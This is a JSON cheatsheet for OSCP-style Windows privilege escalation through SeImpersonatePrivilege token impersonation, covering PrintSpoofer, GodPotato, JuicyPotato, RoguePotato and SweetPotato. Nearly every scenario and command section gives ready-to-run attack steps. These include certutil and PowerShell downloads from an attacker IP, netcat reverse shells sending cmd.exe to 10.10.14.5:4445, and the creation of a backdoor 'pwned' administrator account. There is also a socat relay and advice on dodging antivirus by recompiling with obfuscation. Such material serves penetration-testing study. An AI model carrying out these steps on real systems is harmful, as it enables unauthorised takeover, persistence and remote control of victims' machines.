{
  "cheatsheets": [
    {
      "id": "token-impersonation",
      "name": "Windows Token Impersonation (Potato Attacks)",
      "description": "Comprehensive guide to Windows privilege escalation via token impersonation. Covers SeImpersonatePrivilege abuse using PrintSpoofer, GodPotato, JuicyPotato, RoguePotato, and SweetPotato techniques for escalating from service accounts to SYSTEM.",
      "educational_header": {
        "how_to_recognize": [
          "Service account shell obtained (IIS AppPool, MSSQL, SSRS, Jenkins service, etc.)",
          "SeImpersonatePrivilege ENABLED in 'whoami /priv' output",
          "SeAssignPrimaryTokenPrivilege ENABLED (alternative to SeImpersonate)",
          "Running as NT AUTHORITY\\LOCAL SERVICE, NT AUTHORITY\\NETWORK SERVICE, or IIS APPPOOL\\*",
          "MSSQL xp_cmdshell access with SQL Server service account context",
          "Windows Server 2016/2019/2022 with modern defenses blocking older potatoes"
        ],
        "when_to_look_for": [
          "After initial foothold via web application exploitation (IIS, ASP.NET, PHP on IIS)",
          "Post SQL injection RCE through xp_cmdshell (MSSQL service accounts)",
          "Jenkins/TeamCity/CI-CD server compromise (often run as service accounts)",
          "SSRS (SQL Server Reporting Services) code execution",
          "Any Windows service running web server or database with command execution",
          "When standard privesc vectors fail (no unquoted paths, no weak services)",
          "OSCP Windows boxes with web-based initial foothold (very common pattern)"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: PrintSpoofer - Modern Windows (2016/2019/2022)",
          "context": "Target: Windows Server 2019 with IIS 10. Initial shell as IIS APPPOOL\\DefaultAppPool via ASP.NET deserialization. whoami /priv shows SeImpersonatePrivilege ENABLED. Objective: Escalate to SYSTEM. PrintSpoofer is best choice for Windows 10 1809+ and Server 2019+.",
          "approach": "**Phase 1 - Verify Prerequisites (1 min):**\n\n1. Check current user and privileges:\n   ```\n   whoami\n   whoami /priv\n   ```\n   - Confirm: IIS APPPOOL\\* or similar service account\n   - Confirm: SeImpersonatePrivilege = Enabled\n\n2. Check Windows version:\n   ```\n   systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n   ```\n   - PrintSpoofer works: Windows 10 1809+, Server 2019+\n   - For older systems: Use JuicyPotato (Scenario 3)\n\n**Phase 2 - Transfer PrintSpoofer (1-2 min):**\n\n3. On attacker machine, serve PrintSpoofer:\n   - Download: https://github.com/itm4n/PrintSpoofer/releases\n   - Start server: `python3 -m http.server 80`\n\n4. On target, download to writable directory:\n   ```\n   cd C:\\Windows\\Temp\n   certutil -urlcache -f http://10.10.14.5/PrintSpoofer64.exe ps.exe\n   ```\n   - Or: `powershell -c \"(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/PrintSpoofer64.exe','C:\\Windows\\Temp\\ps.exe')\"`\n\n**Phase 3 - Execute PrintSpoofer (1 min):**\n\n5. Option A - Interactive SYSTEM shell (if you have console):\n   ```\n   C:\\Windows\\Temp\\ps.exe -i -c cmd\n   ```\n   - `-i`: Interactive mode\n   - `-c cmd`: Command to run (cmd.exe)\n   - Spawns new cmd.exe as SYSTEM\n\n6. Option B - Reverse shell to attacker:\n   - Start listener: `nc -nlvp 4445`\n   - Execute:\n   ```\n   C:\\Windows\\Temp\\ps.exe -c \"C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\"\n   ```\n   - Receives SYSTEM shell on listener\n\n7. Option C - Add admin user:\n   ```\n   C:\\Windows\\Temp\\ps.exe -c \"net user pwned Password123! /add\"\n   C:\\Windows\\Temp\\ps.exe -c \"net localgroup administrators pwned /add\"\n   ```\n\n8. Verify SYSTEM:\n   ```\n   whoami\n   ```\n   - Expected: `nt authority\\system`",
          "commands": [
            "printspoofer-interactive",
            "printspoofer-reverse-shell",
            "certutil-download"
          ],
          "expected_outcome": "**Success Timeline (3-5 min):** Privilege check (1 min) -> Transfer (1-2 min) -> SYSTEM shell (1 min). **Success Indicators:** (1) SeImpersonatePrivilege Enabled, (2) PrintSpoofer executes without error, (3) 'nt authority\\system' returned by whoami. **Common Failures:** (1) 'SeImpersonatePrivilege DISABLED' -> Cannot use potato attacks, try other privesc. (2) 'Named Pipe error' -> Print Spooler service disabled, try GodPotato. (3) 'Access denied' downloading -> Use PowerShell IWR or SMB transfer. (4) AV blocking PrintSpoofer -> Try GodPotato or compile from source with obfuscation.",
          "why_this_works": "**PrintSpoofer Mechanics:** Abuses Windows Print Spooler service (spoolsv.exe). Creates named pipe, tricks Print Spooler into connecting, captures SYSTEM token. Newer technique that bypasses JuicyPotato mitigations. **Why SeImpersonatePrivilege Required:** Windows allows service accounts to impersonate clients for delegation scenarios. Token impersonation system call requires this privilege. Service accounts (IIS, MSSQL) get this by default for legitimate purposes. **Print Spooler Abuse:** (1) Create named pipe with SeImpersonatePrivilege, (2) Trigger Print Spooler to connect to our pipe, (3) Spooler connects as SYSTEM (it's a high-privilege service), (4) Capture SYSTEM token from connection, (5) Impersonate SYSTEM token to spawn privileged process. **OSCP Relevance:** Extremely common in OSCP Windows boxes. Web application -> Service account shell -> PrintSpoofer -> SYSTEM is standard attack chain. Modern Windows (Server 2019+) use PrintSpoofer; older use JuicyPotato."
        },
        {
          "title": "Scenario 2: GodPotato - Universal Modern Potato",
          "context": "Target: Windows Server 2022 with disabled Print Spooler (security hardening). Shell as NT AUTHORITY\\LOCAL SERVICE from compromised scheduled task. SeImpersonatePrivilege ENABLED. PrintSpoofer fails due to Print Spooler disabled. Objective: Use GodPotato which doesn't require Print Spooler.",
          "approach": "**Phase 1 - Verify PrintSpoofer Failure (1 min):**\n\n1. Confirm Print Spooler status:\n   ```\n   sc query spooler\n   ```\n   - STATE: STOPPED or SERVICE_NAME doesn't exist = PrintSpoofer won't work\n\n2. Confirm SeImpersonatePrivilege still enabled:\n   ```\n   whoami /priv | findstr SeImpersonate\n   ```\n\n**Phase 2 - Transfer GodPotato (1-2 min):**\n\n3. Download GodPotato:\n   - GitHub: https://github.com/BeichenDream/GodPotato/releases\n   - Versions: GodPotato-NET2.exe (older .NET), GodPotato-NET4.exe (modern)\n\n4. Transfer to target:\n   ```\n   certutil -urlcache -f http://10.10.14.5/GodPotato-NET4.exe C:\\Windows\\Temp\\gp.exe\n   ```\n\n**Phase 3 - Execute GodPotato (1-2 min):**\n\n5. Execute command as SYSTEM:\n   ```\n   C:\\Windows\\Temp\\gp.exe -cmd \"cmd /c whoami\"\n   ```\n   - Should return: `nt authority\\system`\n\n6. Reverse shell to attacker:\n   - Start listener: `nc -nlvp 4445`\n   ```\n   C:\\Windows\\Temp\\gp.exe -cmd \"C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\"\n   ```\n\n7. Alternative - PowerShell reverse shell:\n   ```\n   C:\\Windows\\Temp\\gp.exe -cmd \"powershell -e <BASE64_ENCODED_PAYLOAD>\"\n   ```\n   - Generate payload: `echo -n 'IEX(...)' | iconv -t UTF-16LE | base64 -w0`\n\n**GodPotato Advantages:**\n\n8. Works without Print Spooler (uses DCOM/RPCSS instead)\n9. Works on Windows Server 2012 through 2022\n10. Smaller detection surface than JuicyPotato",
          "commands": [
            "godpotato-cmd",
            "godpotato-reverse-shell",
            "whoami-priv"
          ],
          "expected_outcome": "**Success Timeline (3-5 min):** Spooler check (30 sec) -> Transfer (1-2 min) -> SYSTEM shell (1-2 min). **Success Indicators:** (1) Print Spooler STOPPED confirmed, (2) GodPotato executes without error, (3) Command output shows SYSTEM context. **Common Failures:** (1) '.NET Framework error' -> Try GodPotato-NET2.exe for older systems. (2) 'RPC error' -> RPCSS service might be restricted, try SweetPotato. (3) AV detection -> GodPotato heavily signatured, try compile from source. (4) No SeImpersonatePrivilege -> GodPotato requires this privilege, try other privesc.",
          "why_this_works": "**GodPotato Mechanics:** Uses DCOM (Distributed COM) RPCSS service instead of Print Spooler. Triggers SYSTEM token via IStorage COM interface. More universal than PrintSpoofer. **Why Print Spooler Not Required:** GodPotato targets RPCSS (Remote Procedure Call Subsystem), which is always running (required for Windows operation). Cannot be disabled like Print Spooler. **DCOM Token Capture:** (1) Create IStorage object with our named pipe, (2) Trigger RPCSS to access our pipe as SYSTEM, (3) Capture SYSTEM token from RPCSS connection, (4) Impersonate token for command execution. **Version Compatibility:** Works on Windows Server 2012 R2 through 2022. .NET version matters: NET4 for modern systems, NET2 for older (2012 R2). **OSCP Relevance:** Backup technique when PrintSpoofer fails. Increasingly seen in hardened environments where Print Spooler disabled post-PrintNightmare. Understanding multiple potato variants demonstrates depth."
        },
        {
          "title": "Scenario 3: JuicyPotato - Legacy Windows (2008/2012/2016)",
          "context": "Target: Windows Server 2016 (version 1607). Shell as NT SERVICE\\MSSQLSERVER from xp_cmdshell. SeImpersonatePrivilege ENABLED. Objective: Escalate to SYSTEM using JuicyPotato, which is optimal for older Windows versions.",
          "approach": "**Phase 1 - Verify Windows Version (1 min):**\n\n1. Check exact Windows version:\n   ```\n   systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n   ```\n   - JuicyPotato works: Windows 7/8/10 (before 1809), Server 2008/2012/2016\n   - Does NOT work: Windows 10 1809+, Server 2019+\n\n2. Confirm SeImpersonatePrivilege:\n   ```\n   whoami /priv\n   ```\n\n**Phase 2 - Find Valid CLSID (2-3 min):**\n\n3. JuicyPotato requires CLSID of COM server running as SYSTEM.\n   - Default CLSID often works: `{4991d34b-80a1-4291-83b6-3328366b9097}`\n   - If not, find valid CLSID for your Windows version:\n   - Resource: https://github.com/ohpe/juicy-potato/tree/master/CLSID\n\n4. Common CLSIDs by Windows version:\n   - Server 2016: `{8BC3F05E-D86B-11D0-A075-00C04FB68820}` (WMI)\n   - Server 2012 R2: `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` (Task Scheduler)\n   - Windows 10 pre-1809: `{4991d34b-80a1-4291-83b6-3328366b9097}`\n\n**Phase 3 - Transfer and Execute JuicyPotato (2-3 min):**\n\n5. Download JuicyPotato:\n   - GitHub: https://github.com/ohpe/juicy-potato/releases\n   - Transfer: `certutil -urlcache -f http://10.10.14.5/JuicyPotato.exe C:\\Windows\\Temp\\jp.exe`\n\n6. Create batch file for reverse shell:\n   ```\n   echo C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe > C:\\Windows\\Temp\\rev.bat\n   ```\n\n7. Execute JuicyPotato:\n   ```\n   C:\\Windows\\Temp\\jp.exe -l 1337 -p C:\\Windows\\Temp\\rev.bat -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}\n   ```\n   - `-l 1337`: Local COM server port (any available port)\n   - `-p`: Program to execute as SYSTEM\n   - `-t *`: Try both CreateProcessWithToken and CreateProcessAsUser\n   - `-c`: CLSID to use\n\n8. Start listener before executing:\n   ```\n   nc -nlvp 4445\n   ```\n\n**Troubleshooting CLSID:**\n\n9. If default CLSID fails, test others:\n   ```\n   C:\\Windows\\Temp\\jp.exe -l 1337 -p C:\\Windows\\Temp\\rev.bat -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}\n   ```\n\n10. Download CLSID testing script:\n    - https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1\n    - Run: `powershell -ep bypass -f GetCLSID.ps1`",
          "commands": [
            "juicypotato-execute",
            "juicypotato-clsid-test",
            "netcat-upload"
          ],
          "expected_outcome": "**Success Timeline (5-8 min):** Version check (1 min) -> CLSID selection (2-3 min) -> Transfer/execute (2-3 min). **Success Indicators:** (1) Windows 2016 or earlier confirmed, (2) CLSID found for OS version, (3) Reverse shell received as SYSTEM. **Common Failures:** (1) 'CreateProcessWithTokenW error' -> Try different CLSID. (2) 'The parameter is incorrect' -> Wrong CLSID for OS version. (3) 'RPC Server unavailable' -> Firewall blocking COM port, try different -l port. (4) Windows 10 1809+ or Server 2019+ -> JuicyPotato blocked, use PrintSpoofer/GodPotato.",
          "why_this_works": "**JuicyPotato Mechanics:** Abuses COM/DCOM BITS (Background Intelligent Transfer Service) or other COM servers. Triggers SYSTEM token via impersonation. Original 'potato' technique. **CLSID Requirement:** Different Windows versions have different COM servers available. Must find CLSID of COM server that: (1) Runs as SYSTEM, (2) Is activatable, (3) Will connect to our named pipe. **Why Blocked in Modern Windows:** Microsoft patched COM servers in Windows 10 1809 to prevent unauthorized local privilege escalation. BITS and other common COM servers no longer vulnerable. PrintSpoofer/GodPotato found new vulnerable services. **Attack Flow:** (1) Start fake COM server listening on port, (2) Trigger real COM server (BITS) via CLSID, (3) Real COM server connects to our fake server as SYSTEM, (4) Capture SYSTEM token, (5) Create new process with captured token. **OSCP Relevance:** Still appears in older OSCP machines (Server 2016 era). Understanding JuicyPotato shows historical knowledge. Modern machines use PrintSpoofer/GodPotato."
        },
        {
          "title": "Scenario 4: RoguePotato - Network-Aware Variant",
          "context": "Target: Windows Server 2016/2019 with restricted localhost DCOM. Shell as IIS APPPOOL\\DefaultAppPool. JuicyPotato fails with 'RPC server unavailable'. Network connectivity to attacker available. Objective: Use RoguePotato which redirects DCOM traffic through network.",
          "approach": "**Phase 1 - Verify JuicyPotato Failure (1 min):**\n\n1. Confirm JuicyPotato failure mode:\n   - Error: 'RPC server unavailable' or 'CLSID not found'\n   - This indicates DCOM localhost restrictions\n\n**Phase 2 - Set Up Attacker Relay (2-3 min):**\n\n2. RoguePotato requires attacker machine as OXID resolver.\n   Download: https://github.com/antonioCoco/RoguePotato/releases\n\n3. On attacker machine, start socat relay:\n   ```\n   sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999\n   ```\n   - Relays RPC traffic from attacker:135 to target:9999\n   - Requires root (port 135)\n\n**Phase 3 - Execute RoguePotato (2-3 min):**\n\n4. Transfer RoguePotato to target:\n   ```\n   certutil -urlcache -f http://10.10.14.5/RoguePotato.exe C:\\Windows\\Temp\\rp.exe\n   ```\n\n5. Execute with attacker IP:\n   ```\n   C:\\Windows\\Temp\\rp.exe -r 10.10.14.5 -l 9999 -e \"C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\"\n   ```\n   - `-r 10.10.14.5`: Attacker IP (remote OXID resolver)\n   - `-l 9999`: Local port for RPC listener\n   - `-e`: Command to execute as SYSTEM\n\n6. Start netcat listener before executing:\n   ```\n   nc -nlvp 4445\n   ```\n\n**Alternative: Without socat:**\n\n7. If you have public IP with port 135 accessible:\n   - Run RoguePotato with just `-r YOUR_PUBLIC_IP`\n   - RoguePotato includes built-in OXID resolver\n\n**RoguePotato Advantages:**\n\n8. Bypasses localhost DCOM restrictions\n9. Works when JuicyPotato fails\n10. More reliable on hardened configurations",
          "commands": [
            "roguepotato-execute",
            "socat-relay-135",
            "roguepotato-simple"
          ],
          "expected_outcome": "**Success Timeline (5-8 min):** Socat setup (2 min) -> Transfer (1-2 min) -> Execute (2-3 min). **Success Indicators:** (1) Socat relay running on attacker, (2) RoguePotato connects to relay, (3) SYSTEM shell received. **Common Failures:** (1) 'Connection refused' on 135 -> Firewall blocking, need different approach. (2) No network route -> Target isolated, try PrintSpoofer/GodPotato instead. (3) Socat not installed -> `apt install socat` on Kali. (4) Port 135 already in use -> Kill existing process or use different relay port.",
          "why_this_works": "**RoguePotato Mechanics:** Similar to JuicyPotato but redirects OXID resolution through network. OXID (Object Exporter ID) resolver is RPC endpoint mapper. By controlling OXID resolution, we direct SYSTEM token to our listener. **Why Network Required:** Localhost DCOM hardened in modern Windows. By routing through network (attacker IP), we bypass localhost restrictions. DCOM thinks it's talking to remote server, but traffic returns to target. **Socat Relay Purpose:** Port 135 (OXID resolver) typically filtered. Socat redirects 135->9999 allowing communication on different port. Alternative: Use RoguePotato's built-in resolver if port 135 accessible. **Attack Flow:** (1) Target requests OXID resolution from attacker, (2) Attacker returns malicious endpoint (target's RoguePotato listener), (3) DCOM connects to RoguePotato listener as SYSTEM, (4) RoguePotato captures SYSTEM token, (5) Executes command with SYSTEM privileges. **OSCP Relevance:** Backup technique when other potatoes fail. Shows understanding of DCOM internals. Requires network pivoting knowledge."
        },
        {
          "title": "Scenario 5: SweetPotato - All-in-One Potato",
          "context": "Target: Unknown Windows version. Shell as service account with SeImpersonatePrivilege. Need reliable technique that auto-selects best method. Objective: Use SweetPotato which combines multiple potato techniques.",
          "approach": "**Phase 1 - SweetPotato Overview:**\n\nSweetPotato combines:\n- PrintSpoofer (WinRM, Spooler)\n- EfsPotato (EFS RPC)\n- JuicyPotato (COM/DCOM)\n\nAuto-detects which technique will work.\n\n**Phase 2 - Transfer SweetPotato (1-2 min):**\n\n1. Download SweetPotato:\n   - GitHub: https://github.com/CCob/SweetPotato/releases\n   - Or build from source for latest techniques\n\n2. Transfer to target:\n   ```\n   certutil -urlcache -f http://10.10.14.5/SweetPotato.exe C:\\Windows\\Temp\\sp.exe\n   ```\n\n**Phase 3 - Execute SweetPotato (1-2 min):**\n\n3. Execute with default (auto-select):\n   ```\n   C:\\Windows\\Temp\\sp.exe -a \"C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\"\n   ```\n   - `-a`: Arguments to pass to spawned process\n   - SweetPotato auto-selects best technique\n\n4. Force specific technique:\n   ```\n   C:\\Windows\\Temp\\sp.exe -e EfsPotato -a \"cmd /c whoami\"\n   ```\n   - `-e EfsPotato`: Use EFS technique specifically\n   - Options: `WinRM`, `Spooler`, `EfsPotato`\n\n5. Interactive shell:\n   ```\n   C:\\Windows\\Temp\\sp.exe -p C:\\Windows\\System32\\cmd.exe\n   ```\n   - `-p`: Program to execute (spawns interactive)\n\n**Phase 4 - EfsPotato Technique (Backup):**\n\n6. If standard techniques fail, EfsPotato often works:\n   ```\n   C:\\Windows\\Temp\\sp.exe -e EfsPotato -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\"\n   ```\n   - EfsPotato abuses Encrypting File System RPC\n   - Works even when Spooler disabled\n\n**SweetPotato Advantages:**\n\n7. Single binary, multiple techniques\n8. Auto-detection reduces guesswork\n9. Maintained and updated for new Windows versions",
          "commands": [
            "sweetpotato-auto",
            "sweetpotato-efs",
            "sweetpotato-interactive"
          ],
          "expected_outcome": "**Success Timeline (3-5 min):** Transfer (1-2 min) -> Execute (1-2 min) -> SYSTEM shell. **Success Indicators:** (1) SweetPotato downloads successfully, (2) Auto-selects working technique, (3) SYSTEM shell received. **Common Failures:** (1) All techniques fail -> Check SeImpersonatePrivilege actually enabled. (2) AV blocks -> SweetPotato heavily signatured, compile from source. (3) Specific technique preferred -> Use -e to force technique. **Exam Tip:** SweetPotato is good 'first try' since it auto-selects. If fails, fall back to specific potatoes (PrintSpoofer for new Windows, JuicyPotato for old).",
          "why_this_works": "**SweetPotato Design:** Meta-framework combining multiple token impersonation techniques. Tests available techniques and uses first that works. Reduces manual enumeration of Windows version and available services. **EfsPotato Technique:** Abuses Encrypting File System (EFS) RPC interface. LSASS (runs as SYSTEM) handles EFS operations. By triggering EFS RPC to our pipe, we capture SYSTEM token. Works when Spooler disabled. **Auto-Selection Logic:** SweetPotato checks: (1) Is WinRM available? Use PrintSpoofer variant. (2) Is Spooler running? Use PrintSpoofer. (3) Fallback to EfsPotato. **OSCP Relevance:** Good 'one size fits all' approach. When time-pressured, SweetPotato saves enumeration time. Understanding individual techniques (scenarios 1-4) still important for when auto-selection fails."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Privilege Verification (1-2 minutes)",
          "notes": "Token impersonation requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. Service accounts (IIS, MSSQL, etc.) have these by default. Without these privileges, potato attacks will fail.",
          "commands": [
            {
              "id": "whoami-priv",
              "example": "whoami /priv",
              "shows": "SeImpersonatePrivilege Enabled"
            },
            {
              "id": "whoami-all",
              "example": "whoami /all",
              "shows": "Full user context including groups and privileges"
            },
            {
              "id": "systeminfo-version",
              "example": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
              "shows": "Windows Server 2019 (determines which potato to use)"
            }
          ]
        },
        {
          "title": "Phase 2: Windows Version to Potato Mapping",
          "notes": "Different Windows versions require different potato techniques. PrintSpoofer for modern (2019+), JuicyPotato for legacy (2016 and earlier), GodPotato/SweetPotato as universal fallbacks.",
          "commands": [
            {
              "id": "wmic-os-version",
              "example": "wmic os get caption,version",
              "shows": "Microsoft Windows Server 2019 Standard 10.0.17763"
            },
            {
              "id": "spooler-status",
              "example": "sc query spooler",
              "shows": "STATE: RUNNING (PrintSpoofer will work)"
            },
            {
              "id": "hostname-domain",
              "example": "hostname && echo %userdomain%",
              "shows": "Machine name and domain context"
            }
          ]
        },
        {
          "title": "Phase 3: PrintSpoofer (Windows 2019+)",
          "notes": "Primary choice for modern Windows. Requires Print Spooler service running. Uses named pipe impersonation via spoolsv.exe. Fast and reliable.",
          "commands": [
            {
              "id": "printspoofer-interactive",
              "example": "PrintSpoofer64.exe -i -c cmd",
              "shows": "Spawns interactive SYSTEM cmd.exe"
            },
            {
              "id": "printspoofer-reverse-shell",
              "example": "PrintSpoofer64.exe -c \"nc.exe 10.10.14.5 4445 -e cmd.exe\"",
              "shows": "SYSTEM reverse shell to attacker"
            },
            {
              "id": "printspoofer-add-user",
              "example": "PrintSpoofer64.exe -c \"net user pwned Password123! /add && net localgroup administrators pwned /add\"",
              "shows": "Creates admin user as SYSTEM"
            }
          ]
        },
        {
          "title": "Phase 4: GodPotato (Universal Modern)",
          "notes": "Works when Print Spooler disabled. Uses DCOM/RPCSS instead. Good fallback for hardened Server 2019/2022. Requires appropriate .NET version.",
          "commands": [
            {
              "id": "godpotato-cmd",
              "example": "GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
              "shows": "nt authority\\system"
            },
            {
              "id": "godpotato-reverse-shell",
              "example": "GodPotato-NET4.exe -cmd \"nc.exe 10.10.14.5 4445 -e cmd.exe\"",
              "shows": "SYSTEM reverse shell connection"
            },
            {
              "id": "godpotato-powershell",
              "example": "GodPotato-NET4.exe -cmd \"powershell -ep bypass -c IEX(...)\"",
              "shows": "PowerShell execution as SYSTEM"
            }
          ]
        },
        {
          "title": "Phase 5: JuicyPotato (Windows 2016 and Earlier)",
          "notes": "Legacy technique for older Windows. Requires valid CLSID for target OS version. Does NOT work on Windows 10 1809+ or Server 2019+.",
          "commands": [
            {
              "id": "juicypotato-execute",
              "example": "JuicyPotato.exe -l 1337 -p rev.bat -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}",
              "shows": "Testing CLSID... OK, SYSTEM shell spawned"
            },
            {
              "id": "juicypotato-clsid-wmi",
              "example": "JuicyPotato.exe -l 1337 -p rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}",
              "shows": "WMI CLSID for Server 2016"
            },
            {
              "id": "juicypotato-create-bat",
              "example": "echo nc.exe 10.10.14.5 4445 -e cmd.exe > C:\\Windows\\Temp\\rev.bat",
              "shows": "Creates batch file for JuicyPotato -p parameter"
            }
          ]
        },
        {
          "title": "Phase 6: RoguePotato and SweetPotato (Alternatives)",
          "notes": "RoguePotato for network-redirected DCOM abuse. SweetPotato as all-in-one auto-selector. Use when primary techniques fail.",
          "commands": [
            {
              "id": "roguepotato-execute",
              "example": "RoguePotato.exe -r 10.10.14.5 -l 9999 -e \"nc.exe 10.10.14.5 4445 -e cmd.exe\"",
              "shows": "SYSTEM shell via network OXID relay"
            },
            {
              "id": "sweetpotato-auto",
              "example": "SweetPotato.exe -a \"nc.exe 10.10.14.5 4445 -e cmd.exe\"",
              "shows": "Auto-selects best technique, SYSTEM shell"
            },
            {
              "id": "socat-relay-135",
              "example": "sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999",
              "shows": "Attacker relay for RoguePotato"
            }
          ]
        }
      ],
      "tags": [
        "privilege-escalation",
        "windows",
        "token-impersonation",
        "potato",
        "printspoofer",
        "juicypotato",
        "godpotato",
        "roguepotato",
        "sweetpotato",
        "seimpersonateprivilege",
        "service-account",
        "OSCP:HIGH"
      ]
    }
  ]
}
